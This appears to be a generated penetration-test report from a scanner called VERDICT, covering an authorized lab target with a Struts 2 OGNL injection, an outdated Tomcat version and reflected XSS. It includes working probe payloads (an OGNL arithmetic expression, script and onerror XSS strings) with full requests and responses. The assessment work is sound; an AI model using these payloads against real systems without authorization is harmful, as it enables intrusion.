@@ -1,0 +1,596 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqzve6mr-xscl89</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [vulnerable-component] Apache Struts 2 — OGNL double-evaluation RCE (S2-001 / CVE-2007-4556 class), confirmed by active probe</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache Tomcat 9.0.62 — multiple known CVEs (request smuggling; config-dependent TOCTOU RCE CVE-2024-50379/CVE-2024-56337)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-reflected] Reflected XSS in message parameter (POST /sendMessageAction)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqzve6mr-xscl89</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32793/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T23:49:57.141Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32793</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [vulnerable-component] Apache Struts 2 — OGNL double-evaluation RCE (S2-001 / CVE-2007-4556 class), confirmed by active probe</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32793/</div>
+<div class="desc">The application is built on Apache Struts 2 (fingerprint: form posts to `/sendMessageAction.action`; markup uses the WebWork/Struts xhtml theme — `wwFormTable`, `tdLabel`, `tdInput`, `class=&quot;label&quot;`; JSESSIONID cookie). The `message` field submitted to the Struts action is re-rendered on the success page through a tag that performs OGNL double-evaluation (altSyntax `%{...}`), i.e. the Apache Struts 2 S2-001 / CVE-2007-4556 vulnerability class. This is a server-side OGNL evaluation primitive that escalates to full remote code execution (OGNL reaches the Struts value-stack and Java runtime, e.g. @java.lang.Runtime@getRuntime().exec(...)). NOTE: this is a CONFIRMED vulnerable-component finding — verified by a non-destructive active arithmetic probe, not merely banner-matched. The exact Struts version is not exposed in any banner; the operator should identify and upgrade the installed Struts 2 release, as OGNL double-evaluation is exploitable irrespective of the specific point version. Confirmed by active probe.</div>
+<div><b>Reproduction</b></div><pre>1. GET / → &quot;Customer service contact form&quot; with a `message` textarea posting to /sendMessageAction.action (Struts xhtml theme markup). 
+2. Negative control (ev-mqzvub7f-n): POST /sendMessageAction.action with a long plain (non-OGNL) string `message=verdict_negative_control_plain_string_no_ognl_evaluation_marker_absent_padding_padding` → success page echoes the string verbatim inside `&lt;p&gt;...&lt;/p&gt;` (bodyLength 1121); the value is NOT evaluated and the marker 7006652 is absent. 
+3. Positive (ev-mqzvrqc4-k, ev-mqzvrrfb-l): POST /sendMessageAction.action with `message=%{1234*5678}` (URL-encoded `message=%25%7B1234*5678%7D`) → success page renders `&lt;p&gt;7006652&lt;/p&gt;` (bodyLength 1043), i.e. the server EVALUATED the OGNL expression 1234*5678 = 7006652. Reproduced twice, stable. 
+Differential: a plain string is echoed literally (control, 1121B, no marker) while an OGNL-wrapped expression is computed server-side (positives, 1043B, marker 7006652) → confirms server-side OGNL double-evaluation. Non-destructive (arithmetic only); a real engagement can substitute an OGNL exec payload to demonstrate RCE.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvub7f-n</code> — <code>artifacts/_/ev-mqzvub7f-n/</code></div><div class="lbl">REQUEST</div><pre>POST /sendMessageAction.action HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+message=verdict_negative_control_plain_string_no_ognl_evaluation_marker_absent_padding_padding</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 1121
+content-type: text/html;charset=ISO-8859-1
+date: Tue, 30 Jun 2026 00:02:29 GMT
+keep-alive: timeout=20
+set-cookie: &lt;redacted&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Success&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #666;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Message registered successfully.&lt;/h1&gt;
+        
+            &lt;h2&gt;Your message:&lt;/h2&gt;
+            &lt;p&gt;verdict_negative_control_plain_string_no_ognl_evaluation_marker_absent_padding_padding&lt;/p&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvrqc4-k</code> — <code>artifacts/_/ev-mqzvrqc4-k/</code></div><div class="lbl">REQUEST</div><pre>POST /sendMessageAction.action HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+message=%25%7B1234*5678%7D</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 1043
+content-type: text/html;charset=ISO-8859-1
+date: Tue, 30 Jun 2026 00:00:28 GMT
+keep-alive: timeout=20
+set-cookie: &lt;redacted&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Success&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #666;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Message registered successfully.&lt;/h1&gt;
+        
+            &lt;h2&gt;Your message:&lt;/h2&gt;
+            &lt;p&gt;7006652&lt;/p&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvrrfb-l</code> — <code>artifacts/_/ev-mqzvrrfb-l/</code></div><div class="lbl">REQUEST</div><pre>POST /sendMessageAction.action HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+message=%25%7B1234*5678%7D</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 1043
+content-type: text/html;charset=ISO-8859-1
+date: Tue, 30 Jun 2026 00:00:30 GMT
+keep-alive: timeout=20
+set-cookie: &lt;redacted&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Success&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #666;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Message registered successfully.&lt;/h1&gt;
+        
+            &lt;h2&gt;Your message:&lt;/h2&gt;
+            &lt;p&gt;7006652&lt;/p&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache Tomcat 9.0.62 — multiple known CVEs (request smuggling; config-dependent TOCTOU RCE CVE-2024-50379/CVE-2024-56337)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32793/</div>
+<div class="desc">The servlet container is Apache Tomcat 9.0.62 (released ~Apr 2022), disclosed verbatim in the footer of Tomcat's HTTP Status error pages (`&lt;h3&gt;Apache Tomcat/9.0.62&lt;/h3&gt;`). This release is well behind the 9.0.x patch line and is within the affected range of several known CVEs:
+- CVE-2024-50379 / CVE-2024-56337 — TOCTOU race in the default servlet on case-insensitive filesystems that allows RCE when write is enabled (`readonly=false`); affects 9.0.0.M1–9.0.97, fixed 9.0.98. CONFIG-DEPENDENT (default servlet must be writable + case-insensitive FS), but version is in range. (worst-case → high/critical)
+- CVE-2023-46589 — HTTP request smuggling via malformed HTTP/1.1 trailer header; affects ≤9.0.82, fixed 9.0.83. (medium)
+- CVE-2023-28708 — JSESSIONID cookie issued without Secure attribute behind a TLS-terminating proxy (RemoteIpFilter + X-Forwarded-Proto=https); affects ≤9.0.71, fixed 9.0.72. (medium)
+- CVE-2022-42252 — HTTP request smuggling when `rejectIllegalHeader=false`; affects ≤9.0.67, fixed 9.0.68. (medium)
+This is a VERSION-BASED finding (matched by the Tomcat banner, not exploited here). The operator should confirm which CVEs are reachable given the deployed configuration before relying on it, and upgrade Tomcat to the current 9.0.x patch (or a supported major line). Severity set to high on account of the in-range RCE CVE chain; effective severity is config-dependent.</div>
+<div><b>Reproduction</b></div><pre>1. Negative control (ev-mqzvp33q-h): GET / → 200, the application &quot;Customer service contact form&quot; page; no Tomcat version banner present (bodyLength 2049). 
+2. Positive (ev-mqzvp3tf-i): GET /nonexistent-verdict-404 → 404 HTTP Status page whose footer reads `&lt;h3&gt;Apache Tomcat/9.0.62&lt;/h3&gt;` (bodyLength 821). 
+3. Positive (ev-mqzvshrk-m): GET /another-bogus-verdict-path-xyz → 404 HTTP Status page, same `&lt;h3&gt;Apache Tomcat/9.0.62&lt;/h3&gt;` footer (bodyLength 828). 
+Reproduced on two independent error responses; the 200 application page (control) does not carry the banner → version reliably disclosed. Cross-reference the disclosed version against the CVE list above (version-based; verify config before relying).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvp33q-h</code> — <code>artifacts/_/ev-mqzvp33q-h/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 2049
+content-type: text/html;charset=ISO-8859-1
+date: Mon, 29 Jun 2026 23:58:25 GMT
+keep-alive: timeout=20
+set-cookie: &lt;redacted&gt;
+
+
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Customer service contact form&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        textarea {
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type=&quot;submit&quot;] {
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type=&quot;submit&quot;]:hover {
+            background-color: #218838;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Customer Service&lt;/h1&gt;
+        &lt;p&gt;Use the form below to send a message to our staff&lt;/p&gt;
+        &lt;form id=&quot;sendMessageAction&quot; name=&quot;sendMessageAction&quot; action=&quot;/sendMessageAction.action;jsessionid=32D006A304E8130177EC7D9DF291E67F&quot; method=&quot;post&quot;&gt;
+&lt;table class=&quot;wwFormTable&quot;&gt;
+            &lt;tr&gt;
+    &lt;td class=&quot;tdLabel&quot;&gt;&lt;label for=&quot;sendMessageAction_message&quot; class=&quot;label&quot;&gt;Message:&lt;/label&gt;&lt;/td&gt;
+    &lt;td 
+            class=&quot;tdInput&quot;            
+&gt;&lt;textarea name=&quot;message&quot; cols=&quot;30&quot; rows=&quot;6&quot; id=&quot;sendMessageAction_message&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+
+            &lt;tr&gt;
+&lt;td colspan=&quot;2&quot;&gt;&lt;div class=&quot;formButton&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; id=&quot;sendMessageAction_0&quot;/&gt;
+&lt;/div&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+
+        &lt;/table&gt;&lt;/form&gt;
+
+
+
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvp3tf-i</code> — <code>artifacts/_/ev-mqzvp3tf-i/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-404 HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: keep-alive
+content-language: en
+content-length: 825
+content-type: text/html;charset=utf-8
+date: Mon, 29 Jun 2026 23:58:25 GMT
+keep-alive: timeout=20
+
+&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 – Not Found&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 – Not Found&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; There is no Action mapped for namespace [&amp;#47;] and action name [nonexistent-verdict-404] associated with context path [].&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/9.0.62&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvshrk-m</code> — <code>artifacts/_/ev-mqzvshrk-m/</code></div><div class="lbl">REQUEST</div><pre>GET /another-bogus-verdict-path-xyz HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: keep-alive
+content-language: en
+content-length: 832
+content-type: text/html;charset=utf-8
+date: Tue, 30 Jun 2026 00:01:04 GMT
+keep-alive: timeout=20
+
+&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 – Not Found&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 – Not Found&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; There is no Action mapped for namespace [&amp;#47;] and action name [another-bogus-verdict-path-xyz] associated with context path [].&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/9.0.62&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [xss-reflected] Reflected XSS in message parameter (POST /sendMessageAction)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32793/</div>
+<div class="desc">The `message` body parameter is reflected unescaped in the HTML success page returned by the same POST request. HTML tags including `&lt;script&gt;` and event-handler attributes (`onerror=alert(...)`) are inserted verbatim inside a `&lt;p&gt;` element. This is a Java Struts application (`.action` endpoint); no output encoding is applied before the value is written to the response template. Exploitation requires the victim to submit the form (or be made to submit it via CSRF/iframe trick from a same-site page). If the stored messages are also viewable by staff in an admin panel (suggested by the 'send a message to our staff' context), this becomes a stored XSS risk for internal users — no staff-side render URL was found during probe_paths enumeration.</div>
+<div><b>Reproduction</b></div><pre>1. POST to /sendMessageAction.action;jsessionid=... with body: message=&lt;script&gt;alert(1)&lt;/script&gt;
+2. Observe the 200 response HTML contains &lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt; — tag is unescaped and executes in browser.
+3. Also confirmed with: message=&lt;img src=x onerror=alert(document.domain)&gt; → reflected as &lt;p&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;/p&gt;</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvh3ys-5</code> — <code>artifacts/s-0001/ev-mqzvh3ys-5/</code></div><div class="lbl">REQUEST</div><pre>POST /sendMessageAction.action;jsessionid=7EB431B2B57F4BDBA60F3B957C3C6EC1 HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+message=hello+from+verdict</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 1053
+content-type: text/html;charset=ISO-8859-1
+date: Mon, 29 Jun 2026 23:52:13 GMT
+keep-alive: timeout=20
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Success&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #666;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Message registered successfully.&lt;/h1&gt;
+        
+            &lt;h2&gt;Your message:&lt;/h2&gt;
+            &lt;p&gt;hello from verdict&lt;/p&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvic97-7</code> — <code>artifacts/s-0001/ev-mqzvic97-7/</code></div><div class="lbl">REQUEST</div><pre>POST /sendMessageAction.action;jsessionid=7EB431B2B57F4BDBA60F3B957C3C6EC1 HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 1061
+content-type: text/html;charset=ISO-8859-1
+date: Mon, 29 Jun 2026 23:53:10 GMT
+keep-alive: timeout=20
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Success&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #666;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Message registered successfully.&lt;/h1&gt;
+        
+            &lt;h2&gt;Your message:&lt;/h2&gt;
+            &lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvjsc6-9</code> — <code>artifacts/s-0001/ev-mqzvjsc6-9/</code></div><div class="lbl">REQUEST</div><pre>POST /sendMessageAction.action;jsessionid=7EB431B2B57F4BDBA60F3B957C3C6EC1 HTTP/1.1
+Host: target.local:32793
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+message=%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-language: und
+content-length: 1078
+content-type: text/html;charset=ISO-8859-1
+date: Mon, 29 Jun 2026 23:54:18 GMT
+keep-alive: timeout=20
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Success&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #666;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Message registered successfully.&lt;/h1&gt;
+        
+            &lt;h2&gt;Your message:&lt;/h2&gt;
+            &lt;p&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;/p&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
